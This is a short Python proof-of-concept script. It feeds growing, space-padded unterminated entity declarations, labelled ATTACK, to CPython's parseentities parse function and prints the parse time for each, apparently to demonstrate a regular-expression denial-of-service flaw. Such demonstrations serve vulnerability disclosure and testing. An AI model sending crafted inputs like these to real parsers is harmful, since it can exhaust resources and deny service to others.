from Tools.scripts.parseentities import parse
from time import perf_counter

for i in range(0, 10000):
    ATTACK = '<!ENTITY a CDATA "a" -- ' + ' ' * i * 100
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    parse(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{LEN}: took {DURATION} seconds!")